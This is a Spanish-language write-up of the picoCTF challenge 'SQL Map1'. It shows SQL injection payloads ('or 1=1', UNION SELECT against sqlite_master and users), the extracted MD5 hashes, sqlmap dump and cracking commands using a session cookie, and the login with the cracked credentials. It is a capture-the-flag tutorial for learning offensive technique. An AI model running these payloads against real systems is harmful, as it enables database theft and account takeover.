# Writeup: Sql_Map1
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: Sql Map1 (picoCTF)

Descripción


El reto consiste en un sitio web con un buscador vulnerable a inyección SQL (SQLite). La flag real está oculta y solo se muestra a usuarios autenticados. Los resultados para usuarios anónimos son señuelos. El objetivo es explotar la inyección para obtener credenciales válidas, iniciar sesión y capturar la flag.

Paso 1: Reconocimiento y detección de inyección SQL


Accedemos a la URL proporcionada (por ejemplo, http://lonely-island.picoctf.net:49811/). Encontramos un buscador en /vuln.php?q=. Probamos una comilla simple:

text


http://lonely-island.picoctf.net:49811/vuln.php?q='


Vemos un error o comportamiento anómalo. Luego probamos la clásica inyección:

text


http://lonely-island.picoctf.net:49811/vuln.php?q=' or 1=1 --


El sitio devuelve una lista de pares clave: valor con muchas entradas que parecen flags pero con textos como n0T_F0uNd o tH15_lS_n0T_f!@G, claramente señuelos.

Paso 2: Enumeración manual con UNION


Como la consulta original devuelve 2 columnas (formato clave: valor), usamos UNION SELECT para extraer metadatos de SQLite.


Listar tablas:

text


' union select name, sql from sqlite_master where type='table' --


Resultado:


```
    flags (id, key, value)

    users (id, username, password)

    sqlite_sequence

```

Extraer usuarios y hashes:

text


' union select username, password from users --


Obtenemos:

text


admin: 5a9a79d9fa477ed163b89088681672c9

ctf-player: 7a67ab5872843b22b5e14511867c4e43

kr3s4l4: 330cb1b1696fd9b38ba802482de0156f

...


Los hashes son MD5.

Paso 3: Intento de sqlmap sin autenticación


Ejecutamos sqlmap directamente:

bash


sqlmap -u "http://lonely-island.picoctf.net:49811/vuln.php?q=test" --dbms=sqlite --dump --batch


Pero sqlmap no detecta la inyección (redirecciones, protección de sesión). La inyección manual sí funciona, pero sqlmap necesita una cookie de sesión válida.

Paso 4: Obtener cookie de sesión con F12


Para poder usar sqlmap con autenticación, primero debemos iniciar sesión en el sitio. No conocemos credenciales aún, pero podemos registrar un usuario nuevo (el sitio permite registro). O, alternativamente, craquear los hashes obtenidos.


Registro manual:


```
    Vamos a index.php y nos registramos como test con contraseña test.

    Iniciamos sesión con esas credenciales.

    Abrimos las herramientas de desarrollador (F12) → pestaña "Application" (o "Storage") → Cookies. Copiamos el valor de PHPSESSID.

```

Alternativamente, podemos usar sqlmap para craquear los hashes (ver siguiente paso) y luego iniciar sesión con un usuario real.

Paso 5: Volcado completo con sqlmap usando la cookie


Una vez tenemos una cookie de sesión (por ejemplo, de un usuario registrado o tras craquear un hash), ejecutamos:

bash


sqlmap -u "http://lonely-island.picoctf.net:49811/vuln.php?q=test" \

```
       --cookie="PHPSESSID=c9f71f810c3c1bedfa44302bc9f20c64" \
       --dbms=sqlite --dump --batch --level=5 --risk=3

```

Sqlmap detecta la inyección (boolean, time, UNION) y vuelca todas las tablas. Encuentra la tabla users con los hashes. Automáticamente pregunta si quiere crackearlos con diccionario. Aceptamos y obtiene:


```
    ctf-player: dyesebel

    kr3s4l4: hackpass
    El hash del admin no se crackea con el diccionario por defecto.

```

La tabla flags solo contiene señuelos (10 entradas con textos falsos).

Paso 6: Inicio de sesión como usuario legítimo


Con las credenciales ctf-player:dyesebel, accedemos al formulario de login del sitio (en index.php o mediante un enlace). Tras iniciar sesión, el sitio muestra un área protegida con la **flag**:

text


Protected area

Logged in as: ctf-player

The challenge flag is: picoCTF{*********************}


Resumen de la solución


```
    Detectar inyección SQL con ' or 1=1 --.

    Enumerar tablas y extraer hashes de usuarios.

    Obtener una cookie de sesión (registrando un usuario o craqueando hashes).

    Usar sqlmap con la cookie para volcar la base de datos y crackear hashes.

    Iniciar sesión con las credenciales obtenidas (ctf-player:dyesebel).

    Leer la flag en el área protegida.

```

Herramientas utilizadas


```
    Navegador web (F12 para obtener cookie)

    sqlmap

    Diccionario de contraseñas (rockyou.txt) integrado en sqlmap

```

Nota


La cookie se puede obtener tras registrarse manualmente o tras iniciar sesión con las credenciales crackeadas. En este writeup, primero usamos sqlmap para volcar la tabla users y crackear las contraseñas, luego iniciamos sesión manualmente. La cookie se captura con F12 para permitir a sqlmap actuar como usuario autenticado (aunque en este caso no fue necesario porque ya teníamos las credenciales).

